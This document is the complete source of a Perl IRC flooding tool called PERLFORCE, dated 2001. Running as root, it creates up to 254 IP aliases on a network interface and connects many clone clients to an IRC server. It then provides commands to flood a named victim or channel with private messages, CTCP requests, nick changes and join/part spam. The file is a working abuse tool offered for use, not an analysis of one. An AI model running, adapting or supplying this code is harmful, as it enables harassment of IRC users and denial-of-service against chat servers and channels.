#!/usr/bin/perl -w
#
#	PERLFORCE
#
# By Wooozer    -    jan 2001

use IO::Socket;

die "need uid0\n" unless $< eq 0;

$SIG{PIPE} = 'sigint';

my ($nickpattern,$teller,$clonecounter,$globtime,$handlecounter,$rawmsg);
my ($ifteller,$ircflag,$timeout,$telZ,$noalias,$clonetimer,$nocount);
my (@handlelist);

#MAIN SECTION

proctxt();
print STDERR "MAIN: initialising\n";
init();
getlocal();
print STDERR "MAIN: adding aliases\n";
if ($noalias==0) {
    addalias();
}    
print STDERR "\n\nMAIN: Invoking Usershell\n\n";
usershell();

#ENDMAIN

sub init {
    $sublen=254;
    $teller=1;
    $ifteller=1;
    $clonecounter=1;
    $handlecounter=1;
    $clonetimer=40;
    $nocount=0;
    $telZ=1;
    $globtime=0.10;
    $timeout=2;
    $_ = @ARGV;
    if (/noalias/) {
        $noalias=1;
    } else {
	$noalias=0;
    }
}

sub proctxt {
    print STDERR "\n\n\n\n";
    print STDERR "PERLFORCE\n\n";
    print STDERR "Author: Wooozer\n\n";
    print STDERR "Copyright Wooozer 2001\n\n";
}

sub usershell {
    while (1) {
	print "> ";
        $_=<STDIN>;
	SWITCH: {
	    /loadalias (.*)/ && do {
	        if ($noalias==1) {
		    $sublen=$1;
		    addalias();
		}
		else {
		    print STDERR "startup with: $0 noalias\n";
		}
	    };    
	    /version/ && do {
	        proctxt();
	    };
	    /globtime (.*)/ && do {
	        $globtime=$1;
	    };
	    /load (.*) (.*) (.*) (.*)/ && do {
    		$ircserver=$1;
		$ircport=$2;
		$maxclones=$3;
		$timeout=$4;
		print STDERR "\n\n\n$ircserver port $ircport\n\n";
		makeclones();
		print STDERR "\n ";
	    };
	    /nick (.*)/ && do {
	        $nickpat=$1;
		nickchange();
	    };
    	    /raw (.*)/ && do {
		$rawmsg=$1;
		printclone();
    	    };
    	    /join (.*)/ && do {
		$channel=$1;
        	joinchannel();
    	    };
    	    /part (.*)/ && do {
		$channel=$1;
        	partchannel();
    	    };
	    /nickflood (.*) (.*) (.*)/ && do {
	        $floodtype="nick";
		$floodnr=$1;
		$victim=$2;
		$msg=$3;
		flood();
	    };
    	    /msgflood (.*) (.*) (.*)/ && do {
		$floodtype="msg";
		$floodnr=$1;
        	$victim=$2;
		$msg=$3;
		flood();
    	    };
	    /ctcpflood (.*) (.*) (.*)/ && do {
		$floodtype="ctcp";
		$floodnr=$1;
		$victim=$2;
		$msg=$3;
		flood();
	    };
	    /limitflood (.*) (.*) (.*)/ && do {
		$floodnr=$1;
	        $limit=$2;
		$chan=$3;
		limitflood();
	    };
	    /quit (.*)/ && do {
	        $quitmsg=$1;
		quitclones();
	    };
	    /help/ && do {
		printhelp();
    	    };
	    /stats/ && do {
	        printstats();
	    };
	}
    }
}

sub makeclones {
    $flag=0;
    $telX=1;
    print STDERR "\n\nConnecting Clones to IRC ";
    while ($telX <= $maxclones) {
	$flag=0;
	connectclone();
        if ($ircflag==1) {
            $handle->autoflush();
    	    while (defined($line=<$handle>) && $flag==0) {
	        $_=$line;
        	if (/AUTH/) {
	            $nickpattern="?????????";
	            clonenick();
		    print $handle "NICK $nickpattern 015\012";
	    	    print $handle "USER perlforce perlforce perlforce perlforce\015\012";
		    print STDERR "($telX:$handlecounter)";
		    $flag++;
		    $handlecounter++;
		}
	    }
	}
	else {
	    print STDERR ".";
	}
	$telX++;
    }
}

sub connectclone {
    print STDERR "*";
    eval { local $SIG{ALRM} = sub { die "alrmz" };
	alarm $timeout;
	$handle=IO::Socket::INET->new (Proto  => "tcp",
			   PeerAddr  => $ircserver,
			   PeerPort  => $ircport,
			   LocalAddr => "$myip.$telX");
	alarm 0;
    };
    $_=$@;
    if (/alrmz/) {
        $ircflag=0;
    } 
    else {
        if ($handle) {
	    $handlelist[$handlecounter]=$handle;
	    $ircflag=1;
	}
	else {
	    $ircflag=0;
	}
    }			   
}

sub printclone {
    $handle=$handlelist[$clonecounter];
    if ($handle) {
	print $handle $rawmsg;
    }
    if ($nocount==0) {
	$clonecounter++;
    }
    if ($clonecounter==$handlecounter) {
	$clonecounter=1;
    }
}
		
sub joinchannel {
    $telY=1;
    print STDERR "\n|";
    while ($telY < $handlecounter) {
        $handle=$handlelist[$telY];
	if ($handle) {
	    print STDERR "-";
	    print $handle "JOIN $channel \015\012";
	    select(undef,undef,undef,$globtime);
	} else {
	    print STDERR ".";
	}
	$telY++;
    }
    print STDERR "|\n";
}

sub partchannel {
    $telY=1;
    print STDERR "\n|";
    while ($telY < $handlecounter) {
        $handle=$handlelist[$telY];
	if ($handle) {
	    print STDERR "-";
	    print $handle "PART $channel \015\012";
	    select(undef,undef,undef,$globtime);
	} else {
	    print STDERR ".";
	}
	$telY++;
    }
    print STDERR "|\n";
}

sub flood {
    $rx=1;
    $_=$floodtype;
    print STDERR "\nFlooding target $floodnr times |";
    while ($rx < $floodnr) {
	if (/msg/) {
	    $rawmsg="PRIVMSG $victim $msg \015\012";
	}
	elsif (/ctcp/) {
	    $rawmsg="PRIVMSG $victim \001$msg\001 \015\012";
	}
	elsif (/nick/) {
	    $nickpat=$msg;
	    nickchange();
	}
        printclone();
	print STDERR "-";
	select(undef,undef,undef,$globtime);
	$rx++;
    }
    print STDERR "|\n";
}

sub limitflood {
    $rx=1;
    $qx=1;
    print STDERR "\n|";
    while ($rx <= $floodnr) {
        while ($qx <= $limit) {
            $rawmsg="JOIN $chan \015\012";
    	    printclone();
	    select(undef,undef,undef,0.25);
	    $nocount=1;
	    $rawmsg="PART $chan \015\012";
	    printclone();
	    $nocount=0;
	    select(undef,undef,undef,0.25);
	    print STDERR "-";
	    $qx++;
	}
	select(undef,undef,undef,0.10);
	print STDERR "_";
	$qx=1;
	$rx++;
    }
    print STDERR "|\n";
}

sub addalias {
    print STDERR "\n\nAdding $sublen Aliases\n";
    while ($ifteller <= $sublen) {
	system("ifconfig eth0:$ifteller $myip.$ifteller");
	$ifteller++;
    }
    print STDERR "done.\n";
}

sub getlocal {
    open(IFCONFIG,"ifconfig eth0 2>&1 |") || die "cant fork(): $! \n";
    while (<IFCONFIG>) {
	$_=<IFCONFIG>;
	if (/\Qinet addr\E.([^ ]*)\Q.\E/) {
	    $myip="$1";
	    print STDERR "\n\nUsing: $myip.1 - $myip.$sublen \n\n";
	}
    }
}

sub nickchange {
    $telY=1;
    print STDERR "\n|";
    while ($telY < $handlecounter) {
	$nickpattern=$nickpat;
        $handle=$handlelist[$telY];
	print $handle "NICK $nickpattern \015\012";
	select(undef,undef,undef,$globtime);
	print STDERR "-";
	$telY++;
    }
    print STDERR "|\n";
}

sub quitclones {
    $telY=1;
    while ($telY < $handlecounter) {
        $handle=$handlelist[$telY];
	print $handle "QUIT $quitmsg \015\012";
	$telY++;
    }
}

sub printhelp {
    print STDERR "in this order:\n";
    print STDERR "globtime <nTime> \n";
    print STDERR "loadalias <nAlias> (startup with: $0 noalias)\n";
    print STDERR "load <server> <serverport> <nclones> <timeout>\n";
    print STDERR "nick <cNickPattern>     ?=alpha / %=num / !=odd \n";
    print STDERR "join <channel>\n";
    print STDERR "part <channel>\n";
    print STDERR "raw <msg>\n";
    print STDERR "msgflood <nMsg> <victim/chan> <cMsg>\n";
    print STDERR "ctcpflood <nMsg> <victim/chan> <cCTCP>\n";
    print STDERR "nickflood <nChanges> <victim/chan> <cPattern>\n";
    print STDERR "limitflood <nTimes> <nLimit> <chan>\n";
    print STDERR "stats\n";
    print STDERR "quit <nMsg> \n";
}

sub printstats {
    print STDERR "$handlecounter clones connected to IRC\n";
}

sub clonenick {
    $_ = $nickpattern;
    @alpha=('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');
    @odd=('{','|','[','_','}',']');
    $rnd=int(rand(10)); 
    while (s/\Q%\E/$rnd/) {
        $rnd=int(rand(10));	
    } 
    $rnd=int(rand(26)); 
    $rndchar=$alpha[$rnd];
    while (s/\Q?\E/$rndchar/) {  
	$rnd=int(rand(26)); 
        $rndchar=$alpha[$rnd]; 
    }
    $rnd=int(rand(5)); 
    $rndodd=$odd[$rnd];
    while (s/\Q!\E/$rndodd/) {
	$rnd=int(rand(5));
        $rndodd=$odd[$rnd];
    }
    $nickpattern=$_;
}

sub sigint {
    print STDERR "X";
}